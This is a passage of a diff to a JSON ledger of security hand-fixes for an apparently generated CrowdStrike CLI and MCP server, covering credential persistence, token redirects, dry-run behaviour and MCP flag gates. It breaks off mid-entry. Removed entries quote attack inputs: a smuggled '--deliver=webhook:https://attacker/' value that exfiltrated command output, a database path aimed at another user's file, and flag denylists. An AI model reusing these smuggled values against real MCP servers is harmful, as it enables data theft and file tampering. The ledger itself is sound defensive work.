@@ -3,38 +3,11 @@
  "doc": "docs/reprint-survival.md",
  "handfixes": [
   {
-   "id": "env-oauth-secrets-not-persisted",
-   "summary": "SaveTokens keeps the env-override marker on ClientID/ClientSecret, so env-supplied OAuth credentials are never written to config.toml (issue #266)",
-   "why": "Load() marks ClientID/ClientSecret as env overrides and configForSave() restores the file value for any field still marked -- the mechanism that keeps env-supplied secrets off disk. SaveTokens() cleared both markers on every save, so each token mint (an ordinary authenticated command, no `auth login` step needed) rewrote the live client_id and client_secret into ~/.config/<tool>-cli/config.toml in cleartext, defeating Keychain/Credential-Manager setups that inject the secret as an env var at process launch. SaveTokens now leaves those two markers alone; only MarkCredentialsExplicit clears them, and only `auth login` calls it, passing whether each value came from a flag rather than from the env fallback. Provenance must be declared, not inferred: comparing the incoming value against the loaded one cannot tell an explicit flag from the env value it duplicates, and `auth login` trims its env fallback while Load does not, so a padded variable compares unequal to itself and leaks. Reported by @Xenith-B against halopsa-cli/ninjaone-cli. GENERATOR-class defect (the press emits the unconditional deletes) tracked for an upstream retro; until the press is fixed, a reprint reintroduces the leak and these markers guard the connector. Bug-fix-only: no new flag, command, or output.",
-   "status": "active",
-   "spec_encode_followup": "DONE UPSTREAM: mvanhorn/cli-printing-press#4393 merged 2026-08-28 (closed #4283 as completed), first shipped press v4.31.2; this hand-fix stays active until a reprint absorbs it; do NOT cite #4283 as open. Encoded there: SaveTokens must not clear the ClientID/ClientSecret env-override markers. Only a credential the caller supplied through an explicit command-line flag may clear them, and the flag's provenance must be passed in by the caller -- NOT inferred by comparing the incoming value against the loaded one. An explicit flag whose value equals the environment's is still explicit and must persist; conversely `auth login` trims its env fallback while Load does not, so a padded variable compares unequal to itself and a value-based rule leaks it.",
-   "asserts": [
-    {
-     "file": "cli/internal/config/config.go",
-     "contains": "func (c *Config) MarkCredentialsExplicit(clientID, clientSecret bool) {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/cli/auth.go",
-     "contains": "cfg.MarkCredentialsExplicit(explicitClientID, explicitClientSecret)",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/config/config.go",
-     "contains": "markers now survive a save; only MarkCredentialsExplicit clears them.",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/config/config.go",
-     "not_contains": "delete(c.envOverrides, \"ClientID\")\n\tdelete(c.envOverrides, \"ClientSecret\")\n\tdelete(c.envOverrides, \"AccessToken\")"
-    }
-   ]
-  },
-  {
    "id": "doctor-auth-hint-names-a-real-command",
+   "class": "doctor-truth",
+   "status": "active",
    "summary": "doctor, the CLI error path and the MCP error path all point at `crowdstrike-cli auth login` instead of a nonexistent `auth setup` subcommand (issue #277, #278)",
    "why": "This CLI's `auth` parent defines login, status, set-token and logout. It has never defined `setup`, yet three generated surfaces told operators to run it: doctor.go's auth_hint (fires when cfg.AuthHeader() is empty), helpers.go's HTTP 400/401/403 remediation, and internal/mcp/tools.go's tool-error text -- 7 occurrences in all. Cobra does not error on an unknown subcommand of a NON-root parent (legacyArgs only rejects unknown args for the root), and the generated parent runs parentNoSubcommandRunE, which returns cmd.Help() -- a nil error. So `crowdstrike-cli auth setup` printed help and exited 0. There was no 'unknown command' error and no non-zero exit anywhere in the journey: an operator saw a success code and was no closer to credentials, and because these are agent-first CLIs with typed exit codes, an agent performing setup read exit 0 as success and carried on unauthenticated. The hint fires exactly when it matters -- fresh install, rotated secret, new machine, expired token. This skill emits no auth_instructions field, so these hints are the only setup guidance it gives. The replacements name the real command and, in doctor, the variables `auth login` actually reads: FALCON_CLIENT_ID and FALCON_CLIENT_SECRET (plus the optional CROWDSTRIKE_OAUTH_SCOPE), taken from the login command's own env fallbacks rather than composed. Reported by @geekbrownbear, who verified halopsa and ninjaone live against an empty config (PR #277) and filed appdirect/crowdstrike as issue #278; the fleet scan that found the other two surfaces and confirmed only these four connectors are affected was done during triage. GENERATOR-class defect: until the press is fixed, a reprint reintroduces all 7 strings and these asserts guard them. Bug-fix-only: no new flag, command, or output field.",
-   "status": "active",
    "spec_encode_followup": "DONE UPSTREAM: mvanhorn/cli-printing-press#4315 closed as completed 2026-08-25 ('already fixed on current main': the oauth2 auth hint names `auth login` since PR #2875, merged 2026-06-08, first shipped press v4.25.0); this hand-fix stays active until a reprint absorbs it, and the helpers.go and MCP tool-error surfaces must be re-checked at that reprint because upstream's closure named only doctor's auth_hint and the usage error; do NOT cite #4315 as open. Encoded there: Derive the auth hint from the subcommand set the connector actually generates instead of the fixed \"Run '<cli> auth setup' for credential setup steps.\" string in internal/generator/generator.go. 52 of 56 connectors do define `auth setup`, which is why the hard-coded string went unnoticed; the four OAuth client-credentials connectors that scaffold `auth login` instead (appdirect, crowdstrike, halopsa, ninjaone) each shipped it 7 times. The same string is emitted into three surfaces -- doctor.go's auth_hint, helpers.go's 400/401/403 remediation, and the MCP server's tool-error text -- so a generator fix must cover all three.",
    "asserts": [
     {
@@ -73,16 +46,17 @@
   },
   {
    "id": "doctor-verdict-tracks-reality",
+   "class": "doctor-truth",
+   "status": "active",
    "summary": "doctor probes a real GET endpoint with the real credential and refuses to dial a placeholder base_url, instead of calling any HTTP response 'reachable' and never checking the credential",
    "why": "`doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` \"reachable\" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed \"present, not verified\" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as \"FAIL API: unreachable\" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282.",
-   "status": "active",
    "asserts": [
     {
      "file": "cli/internal/cli/doctor_verdict.go",
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
@@ -104,14 +78,45 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorProbeCredentials(cmd.Context(), c, cmd.Root(),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
   {
    "id": "install-credentials-declared-on-every-channel",
+   "class": "docs",
+   "status": "active",
    "summary": "every operator credential this connector reads is declared on all three install channels: manifest.json (.mcpb), server.json (MCP Registry) and mcp-install.md (manual install)",
    "why": "Issue #282 ('three live-verified connectors prompt for the wrong credentials'). A connector is installed through THREE independent channels that each carry their own copy of the credential list: manifest.json server.mcp_config.env (what the .mcpb bundle hands Claude Desktop, which has no shell profile, no config.toml and no export - so an undeclared variable is a variable nobody is ever asked for), server.json environmentVariables (the MCP Registry publish channel), and mcp-install.md's copy-paste JSON blocks plus its remote launch line (the manual path, which never touches the bundle at all). The fleet-wide audit found 60 of 65 connectors under-declaring 122 operator-facing variables in the manifest, 61 of 65 mcp-install.md pages omitting 125, and hudu's server.json missing the base URL its manifest marks required. For crowdstrike the manifest gained: CROWDSTRIKE_BASE_URL, CROWDSTRIKE_TOKEN_URL. server.json gained: CROWDSTRIKE_BASE_URL, CROWDSTRIKE_TOKEN_URL. mcp-install.md's env blocks gained: CROWDSTRIKE_BASE_URL, CROWDSTRIKE_TOKEN_URL. manifest.json, server.json and mcp-install.md are ALL regenerated by /msp-skills-publish on an UPDATE or re-onboard, so without this ledger a regeneration silently drops every declaration and CI stays green (check_env_schema.py is wired --warn). The asserts below name the specific credentials, not a count, so dropping one and adding another cannot cancel out.",
-   "status": "active",
    "spec_encode_followup": "cli-printing-press should emit server.mcp_config.env, the matching user_config prompts, server.json environmentVariables and mcp-install.md's env blocks from ONE declaration of the connector's operator-facing environment, so the three channels cannot be generated out of step. Until then check_env_schema.py compares all three and this ledger pins them.",
    "asserts": [
     {
@@ -192,59 +197,11 @@
    ]
   },
   {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
    "id": "no-config-write-switch",
+   "class": "write-safety",
+   "status": "active",
    "summary": "CROWDSTRIKE_NO_CONFIG_WRITE makes every credential write a no-op (token cache included) while leaving the `auth logout` erase working, and the MCP server honours it too (issue #270)",
    "why": "Issue #270, raised by @Xenith-B off the back of #266. #266 stopped env-supplied client credentials reaching disk; the MINTED access token still landed in ~/.config/<tool>-cli/config.toml in cleartext and there was no supported way to turn that off. Their workaround was `--config NUL`, which is OS-specific, undocumented, makes doctor report a false 'not configured', and - the part that matters most - does not cover the MCP servers at all, because internal/mcp resolved its own hardcoded config path and ignored --config. Three deliberate boundaries make this switch honest rather than merely quiet. (1) ClearTokens keeps calling save() directly: it is the ERASE path, and routing it through the guard would make `auth logout` silently inert, which is a worse defect than the one being fixed. (2) `auth login` and `auth set-token` REFUSE and name the variable rather than reporting a save that did not happen - a false success is the same defect class as a doctor that says credentials are fine without checking. (3) newMCPClient now resolves through config.Load(\"\"), the resolver the CLI uses, so the MCP server honours both CROWDSTRIKE_CONFIG and this switch; that is the half the issue says is uncovered today. The variable is declared on all three install channels because for a Claude Desktop install the manifest prompt is the ONLY channel that can set an environment variable. Class C, new documented surface. GENERATOR-class: a reprint drops the switch entirely and silently restores the plaintext token cache.",
-   "status": "active",
    "spec_encode_followup": "cli-printing-press should emit <PREFIX>_NO_CONFIG_WRITE (or an equivalent) as part of the standard config surface, with the same three boundaries: the erase path exempt, explicit save commands failing loudly rather than no-oping, and the MCP server resolving its config through config.Load(\"\") instead of a hardcoded home-relative path. The hardcoded path in internal/mcp/tools.go is a generator defect in its own right - it makes --config and <PREFIX>_CONFIG inert for every MCP install on every connector.",
    "asserts": [
     {
@@ -298,11 +255,6 @@
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/mcp_config_resolution_test.go",
-     "contains": "func TestMCPClientHonoursTheConfigEnvVar(",
-     "min_count": 1
-    },
-    {
      "file": "cli/internal/cli/auth.go",
      "contains": "if config.NoConfigWrite() {",
      "min_count": 2
@@ -316,52 +268,22 @@
      "file": "guide.md",
      "contains": "| `auth login` / `auth set-token` | Refuse, naming the variable, instead of reporting a save that did not happen. |",
      "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
+    },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
+     "file": "cli/internal/config/config.go",
+     "contains": "return c.saveCredentialMaterial()",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
+     "file": "cli/internal/config/config.go",
+     "contains": "func NoConfigWrite() bool {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
+     "file": "cli/internal/cli/auth.go",
+     "contains": "if config.NoConfigWrite() {",
      "min_count": 1,
      "code_only": true
     }
@@ -370,14 +292,14 @@
   {
    "id": "mcp-local-read-flag-expected",
    "class": "mcp-local-path-flag",
+   "status": "active",
    "summary": "The MCP shell-out layer refuses `fleet tenants --expected`, which names a file on the machine that runs the MCP server, by listing it in blockedDestinationFlags",
    "why": "`fleet tenants --expected` names a newline-delimited CID list the CLI reads off the local disk. The MCP server runs this CLI as the account that hosts it and forwarded the flag, so one tool call could point the read at any file that account can reach and get the parsed rows back. Reproduced on origin/main d3cbf7129 (connector tree unchanged at 518e1edff) with the real MCP binary and a recording stand-in for the companion CLI: tools/call with the flag set reached the CLI argv. The flag's usage text did not say it took a path, so isFilesystemPathFlag missed it and TestNoShellOutToolCanDirectAFilesystemPath stayed green; the usage text now says 'Path to', which makes that test fail until the floor names the flag, so a reprint that drops this entry fails the build. The operator still passes the flag on the command line. Found while vetting the gosec G304 finding its `#nosec G304` annotation hid from the security gate.",
-   "status": "active",
    "spec_encode_followup": "Press-side: classify a novel command's local-input flags as filesystem flags from the flag's type or a declared annotation, not only from phrases in its usage text.",
    "asserts": [
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "\"expected\":",
+     "file": "cli/internal/cli/fleet_tenants.go",
+     "contains": "\"mcp:read-flags\": \"expected\"",
      "min_count": 1
     },
     {
@@ -388,128 +310,13 @@
    ]
   },
   {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say this build's remote path is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
    "id": "dry-run-never-mints",
    "class": "write-safety",
+   "status": "active",
    "summary": "--dry-run never mints a token or changes stored credentials: neither the client's automatic client-credentials mint nor `auth login --dry-run` sends the client secret to the token URL, and `auth set-token --dry-run` and `auth logout --dry-run` neither save nor clear anything",
    "why": "tools/maintainer/class_harness.py write-safety found every --dry-run of a write command putting one request on the wire: authHeader ran before the dry-run branch and, with no cached token, POSTed the client ID and secret to the token URL and cached the token, while the generated comment and the docs say a dry run sends nothing. `auth login` minted through its own path and ignored --dry-run, and `auth set-token` and `auth logout` saved and cleared credentials under --dry-run (found by Codex review round 1). Same fix shape as connectwise-rmm, sophos-central and watchguard (dry-run-never-mints). TestDryRunNeverMintsAToken, TestAuthLoginDryRunSendsNothing and TestAuthSetTokenAndLogoutHonorDryRun count requests to a stub token server (each with a live control that proves the probe reaches the mint) and fail on the generated code.",
-   "status": "active",
    "spec_encode_followup": "Press fix: client.go.tmpl should skip the client-credentials mint when DryRun is set (the dry-run preview already uses cached material only), and auth.go.tmpl's login should honor the root --dry-run flag.",
    "asserts": [
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "if !c.DryRun && needsClientCredentialsMint(c.Config) {",
-     "min_count": 1,
-     "code_only": true
-    },
     {
      "file": "cli/internal/cli/auth.go",
      "contains": "(dry run - no request sent, nothing saved)",
@@ -551,9 +358,9 @@
   {
    "id": "token-request-stays-on-origin",
    "class": "auth-wire",
+   "status": "active",
    "summary": "Every token request (auth login, the automatic client-credentials mint and the refresh grant) goes through cliutil.OAuthTokenHTTPClient, which follows same-origin redirects only, so the client secret never reaches a host a redirect from the token URL names",
    "why": "Owner decision on PR #441 (finish the auth-wire class). `auth login` (through http.DefaultClient) and the automatic client-credentials mint and refresh grant (through c.HTTPClient, whose CheckRedirect follows a 307 to another host) replayed the token request body, the client secret included, to whatever host a redirect from the token URL named. Printed before press 4.33.5, which routes every token request through cliutil.OAuthTokenHTTPClient (a token client that follows same-origin hops only); this back-ports that file verbatim and uses it at the same call sites. TestAuthLoginRefusesATokenRedirectToAnotherOrigin and TestTokenMintRefusesARedirectToAnotherOrigin failed on the previous commit (the second host received the token request) and pass now. The host compare is also hardened (see the newer-print entries): an IP literal compares exactly, IPv6 zone included; a DNS name folds ASCII case only.",
-   "status": "active",
    "spec_encode_followup": "Press-side: auth.go.tmpl and client.go.tmpl in press 4.33.5 already route token requests through cliutil.OAuthTokenHTTPClient; oauthTokenSameOrigin should compare IP literals exactly (zone included) and fold ASCII case only for DNS names.",
    "asserts": [
     {
@@ -605,15 +412,21 @@
      "contains": "func TestAuthLoginRefusesATokenRedirectToAnotherOrigin(",
      "min_count": 1,
      "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/oauth_token.go",
+     "contains": "if !oauthTokenSameHost(target.Hostname(), origin.Hostname()) {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
   {
    "id": "member-cid-token-stays-on-origin",
    "class": "auth-wire",
+   "status": "active",
    "summary": "`fleet sync --member-cid` mints its child-tenant token through cliutil.OAuthTokenHTTPClient, so a redirect from the token URL to another host never receives the client secret",
    "why": "Codex review round 3 on PR #441, confirmed by the owner as a secret leak: fleetClientForCID built a plain http.Client for the scoped member-CID mint, and Go replays the form (client_id, client_secret, member_cid) on a 307 to another host. With FALCON_CLIENT_ID/FALCON_CLIENT_SECRET set and the token endpoint answering 307 to a second port, `fleet sync --member-cid <cid>` sent the secret there. TestMemberCIDMintRefusesATokenRedirectToAnotherOrigin failed on the previous commit (the second host received the secret) and passes now; TestMemberCIDMintFollowsASameOriginRedirect is the same-origin control. fleet_sync.go is a hand-authored novel file; a reprint regenerates it as a stub, so this entry is what notices.",
-   "status": "active",
    "asserts": [
     {
      "file": "cli/internal/cli/fleet_sync.go",
@@ -634,182 +447,1185 @@
    ]
   },
   {
-   "id": "secret-echo-decoded-funnel",
+   "id": "no-response-cache",
    "class": "secret-echo",
-   "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown); the OAuth client-credentials token endpoint's error body; the token refresh endpoint's error body. The `auth login` token exchange (internal/cli/auth.go mintClientCredentialsToken) funnels its error body with the client secret it sent. So does the per-tenant (member CID) token mint of fleet sync (internal/cli/fleet_sync.go). Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope 